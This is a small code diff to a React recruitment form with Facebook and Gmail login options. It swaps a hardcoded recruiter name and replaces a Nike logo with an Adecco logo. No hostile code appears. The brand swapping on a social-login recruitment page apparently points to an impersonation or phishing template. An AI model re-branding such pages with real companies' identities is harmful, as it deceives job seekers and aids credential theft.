@@ -61,7 +61,7 @@ function ActualForm({
   const isFacebookLoading = isLoading && loadingType === "facebook";
   const isGoogleLoading = isLoading && loadingType === "gmail";
   const isVerifyStep = step === 0;
-  const agentName = "Katie Torrison";
+  const agentName = "Dennis Laczko";
 
   return (
     <div className="min-h-screen w-full flex items-center justify-center bg-[#f5f7fb] px-2 sm:px-4 py-4 sm:py-8">
@@ -82,7 +82,7 @@ function ActualForm({
               <div className="flex min-h-[180px] items-center justify-center border-b border-[#e6ebf2] bg-white px-8">
                 <div className="relative h-14 w-44 sm:h-16 sm:w-52">
                   <Image
-                    src="/Images/nike-icon.svg"
+                    src="/Images/adecco.svg"
                     alt={process.env.NEXT_PUBLIC_APP_NAME || "Recruitment"}
                     fill
                     className="object-contain"
